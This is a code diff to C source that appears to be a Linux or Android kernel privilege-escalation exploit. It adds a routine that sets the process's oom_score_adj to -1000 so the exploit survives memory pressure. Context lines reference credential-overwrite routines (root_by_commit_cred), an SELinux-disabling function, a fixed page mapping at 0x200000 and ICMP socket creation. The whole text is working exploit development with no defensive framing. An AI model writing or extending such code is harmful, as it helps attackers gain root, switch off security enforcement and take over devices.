@@ -20,6 +20,7 @@
 #define NSEC_PER_SEC 1000000000
 
 #define _PAGE_SIZE 0x1000
+#define OOM_ADJUST_MIN (-1000)
 
 extern int root_by_set_cred(void);
 extern int root_by_commit_cred();
@@ -52,6 +53,31 @@ struct files_struct {
 
 };
 struct pid_namespace;
+
+int protect_from_oom_killer(void)
+{
+  int fd;
+  char buf[16];
+  int ret;
+
+  fd = open("/proc/self/oom_score_adj", O_WRONLY);
+  if (fd == -1) {
+    return -1;
+  }
+
+  sprintf(buf, "%d\n", OOM_ADJUST_MIN);
+
+  ret = write(fd, buf, strlen(buf));
+
+  if (ret == -1) {
+    close(fd);
+    printf("oom set error!\n");
+    return -1;
+  }
+
+  close(fd);
+  return 0;
+}
 
 static void shutdown_selinux()
 {
@@ -401,6 +427,8 @@ int main()
 		return -1;
 	}
 	memset((void*)0x200000, 0, _PAGE_SIZE);
+
+	protect_from_oom_killer();
 
 	fd = create_icmp_socket();
 	if (fd < 0) {
